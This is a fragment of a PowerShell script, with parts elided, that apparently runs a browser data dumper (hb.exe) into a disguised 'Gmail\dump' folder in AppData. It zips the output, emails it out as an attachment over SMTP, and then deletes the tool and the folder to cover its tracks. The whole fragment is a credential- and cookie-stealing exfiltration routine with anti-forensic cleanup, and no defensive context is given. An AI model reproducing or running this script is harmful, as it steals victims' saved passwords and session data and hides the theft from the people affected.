...
mkdir "$env:appdata\Gmail\dump"
Set-Location "$env:appdata\Gmail\dump"
...
.\hb.exe --format json
Remove-Item -Path "$env:appdata\Gmail\dump\hb.exe" -Force
...
$files=Get-ChildItem
$Message.Attachments.Add("$env:appdata\Gmail\dump\dump.zip")
$smtp.Send($Message)
$Message.Dispose()
$smtp.Dispose()
#Cleanup
cd "$env:appdata"
Remove-Item -Path "$env:appdata\Gmail\dump" -Force -Recurse
